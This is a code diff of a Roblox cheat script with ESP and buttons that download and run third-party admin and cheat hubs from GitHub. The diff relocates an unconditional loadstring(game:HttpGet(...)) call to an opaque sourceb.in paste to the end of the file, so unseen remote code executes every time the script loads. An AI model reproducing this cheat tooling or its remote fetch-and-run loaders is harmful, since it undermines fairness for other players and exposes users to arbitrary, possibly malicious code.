@@ -752,7 +752,6 @@ end)
 Players.PlayerRemoving:Connect(function(player)
     removeESP(player)
 end)
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/cyktNDjafL/0", true))()
 HubsTab:CreateButton({Name="Infinite Yield",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()end})
 HubsTab:CreateButton({Name="Ghost Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub"))()end})
 HubsTab:CreateButton({Name="Nameless Admin",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()end})
@@ -813,4 +812,5 @@ Luna:Notification({
     ImageSource = "Material"
 })
 
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/cyktNDjafL/0", true))()
 
